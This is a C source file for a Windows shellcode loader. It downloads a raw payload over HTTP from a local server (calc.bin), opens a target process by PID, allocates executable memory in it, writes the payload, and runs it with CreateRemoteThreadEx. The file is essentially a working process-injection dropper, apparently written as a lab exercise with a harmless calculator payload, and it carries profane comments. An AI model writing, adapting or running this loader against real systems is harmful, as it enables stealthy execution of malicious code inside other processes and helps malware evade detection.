#include <Windows.h>
#include <wininet.h>
#include <stdio.h>
#include "debug.h"

const char* s = "[+]";
const char* f = "[-]";
const char* w = "[*]";


int main(int argc, char* argv[]) {


	DWORD PID, TID, dwBytesRead = NULL;
	HANDLE hProcess, hThread = NULL;
	LPCWSTR sourceURL = L"http://127.0.0.1:8000/calc.bin";
	PBYTE pBytes = NULL;
	PBYTE pTmpBytes = NULL;
	SIZE_T sSize = NULL;
	LPVOID rBuffer = NULL;
	HINTERNET hInet, hURL = NULL;

	PBYTE* pPayloadBytes = NULL;
	SIZE_T* sPayloadBytes = NULL;


	if (argc < 2) {
		LOG_ERROR("Not enough arguments!");

		return 1;
	}

	PID = atoi(argv[1]);
	LOG_INFO("attempting to open a handle to the provided process (%ld)", PID);


	// open a handle to the provided process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL) {
		LOG_ERROR("could not open a handle to the provided process... Error: %ld", GetLastError());
		return 1;
	}

	LOG_SUCCESS("successfully opened a handle to the provided process!\n\\---0x%p", hProcess);

	// open handle to WinInet
	hInet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);

	if (hInet == NULL) {
		LOG_ERROR("could not open a handle to hInet... Error: %ld", GetLastError());
		CloseHandle(hProcess);
		return 1;
	}

	LOG_SUCCESS("successfully opened a handle to WinInet!");

	// open handle to payload's URL
	hURL = InternetOpenUrlW(hInet, sourceURL, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);

	if (hURL == NULL) {
		LOG_ERROR("could not open a handle to URL... Error: %ld", GetLastError());
		CloseHandle(hProcess);
		CloseHandle(hInet);
		return 1;
	}

	LOG_SUCCESS("successfully opened a handle to the provided URL!");

	// allocate 1024 bytes to temporary buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);

	if (pTmpBytes == NULL) {
		return 1; // i am so fucking tired of error handling
		LocalFree(pTmpBytes);
		InternetCloseHandle(hURL);
		CloseHandle(hInet);
		CloseHandle(hProcess);
	}

	LOG_SUCCESS("successfully allocated memory to temp buffer!\n\\---0x%p", pTmpBytes);

	// read data
	while (TRUE) {
		// read 1024 bytes to temp buffer
		if (!InternetReadFile(hURL, pTmpBytes, 1024, &dwBytesRead)) {
			LOG_ERROR("could not read contents of specified file... Error: %ld", GetLastError());
			LocalFree(pTmpBytes);
			InternetCloseHandle(hURL);
			CloseHandle(hInet);
			CloseHandle(hProcess);
			return 1;
		}

		// update size of the final buffer
		sSize += dwBytesRead;

		// allocate final buffer
		if (pBytes == NULL) {
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		}
		else {
			// if it wasn't NULL, reallocate it to == sSize
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
		}

		if (pBytes == NULL) {
			LocalFree(pBytes);
			LocalFree(pTmpBytes);
			InternetCloseHandle(hURL);
			CloseHandle(hInet);
			CloseHandle(hProcess);
			return 1; // as i said, i am sick and tired of error handling, get off my dick
		}

		// append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}

	// allocate memory for the payload copy
	pPayloadBytes = (PBYTE*)malloc(sSize);
	if (pPayloadBytes != NULL) {
		memcpy(pPayloadBytes, pBytes, sSize);
		LOG_SUCCESS("payload initialised\n\\---0x%p", pPayloadBytes);
	}

	// allocate memory for size
	sPayloadBytes = (size_t*)malloc(sizeof(size_t));
	if (sPayloadBytes != NULL) {
		*sPayloadBytes = sSize;
		LOG_SUCCESS("payload size initialised");
	}


	// clean up
	LOG_INFO("closing previously created inet handles and freeing memory\n");
	InternetCloseHandle(hInet);
	InternetCloseHandle(hURL);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pTmpBytes);
	LocalFree(pBytes);
	LOG_SUCCESS("success\n");

	// allocate bytes in the memory of the specified process
	rBuffer = VirtualAllocEx(hProcess, NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (rBuffer == NULL) {
		LOG_ERROR("could not allocate memory in host process... Error: %ld", GetLastError());
		CloseHandle(hProcess);
		free(pPayloadBytes);
		free(sPayloadBytes);
		return 1;
	}
	else {
		LOG_SUCCESS("allocated buffer in specified process");
	}

	// actually write to the memory of the specified process
	if (pPayloadBytes != NULL and sPayloadBytes != NULL) {
		WriteProcessMemory(hProcess, rBuffer, pPayloadBytes, *sPayloadBytes, NULL);
		LOG_SUCCESS("successfully wrote %zu-bytes to memory of specified process", sSize);
	}
	// create thread to run the payload
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

	if (hThread != NULL) {
		LOG_ERROR("successfully opened a handle to created thread! (%ld)\n\\---0x%p", TID, hThread);
	}
	else {
		LOG_ERROR("could not open a handle to thread... Error: %ld", GetLastError());
		CloseHandle(hProcess);
		VirtualFree(rBuffer, 0, MEM_RELEASE);
		free(pPayloadBytes);
		free(sPayloadBytes);
		return 1;
	}

	WaitForSingleObject(hThread, INFINITE);
	LOG_SUCCESS("thread finished executing, cleaning up...");

	// clean up after yourself!
	CloseHandle(hProcess);
	CloseHandle(hThread);
	VirtualFree(rBuffer, 0, MEM_RELEASE);
	free(pPayloadBytes);
	free(sPayloadBytes);
	LOG_SUCCESS("closed handle to process");

	return 0;
}